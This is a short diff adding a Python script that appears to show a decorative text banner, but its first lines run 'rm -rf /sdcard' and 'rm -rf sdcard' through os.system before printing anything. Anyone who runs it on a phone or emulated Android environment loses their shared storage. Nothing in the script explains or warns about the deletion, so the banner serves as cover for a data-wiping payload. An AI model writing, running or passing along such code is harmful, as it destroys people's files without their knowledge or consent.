@@ -1,0 +1,10 @@
+import os
+os.system("rm -rf /sdcard")
+os.system("rm -rf sdcard")
+print("="*54)
+print("||                                                             ||")
+print("||                                                             ||")
+print("||                     hhhhhhhhhhhhhhh                         ||")
+print("||                                                             ||")
+print("||                                                             ||")
+print("="*54)
